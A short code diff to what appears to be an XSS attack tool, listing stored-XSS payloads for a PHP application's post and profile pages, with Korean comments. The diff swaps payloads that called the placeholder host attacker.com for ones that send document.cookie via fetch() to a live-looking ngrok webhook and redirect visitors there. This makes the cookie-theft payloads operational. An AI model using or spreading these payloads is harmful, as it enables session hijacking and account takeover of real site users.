@@ -360,8 +360,8 @@ class AdvancedXSSScanner(XSSScanner):
             'new_post.php': [
                 # 게시글 작성 페이지 - Stored XSS
                 '<script>document.cookie</script>',
-                '<img src=x onerror="fetch(\'http://attacker.com/steal?c=\'+document.cookie)">',
-                '<svg/onload="location.href=\'http://attacker.com\'">',
+                '<img src=x onerror="fetch(\'https://irremeable-zoe-scabrous.ngrok-free.dev/webhook?c=\'+document.cookie)">',
+                '<svg/onload="location.href=\'https://irremeable-zoe-scabrous.ngrok-free.dev\'">',
             ],
             'profile.php': [
                 # 프로필 페이지 - 이메일/이름 필드
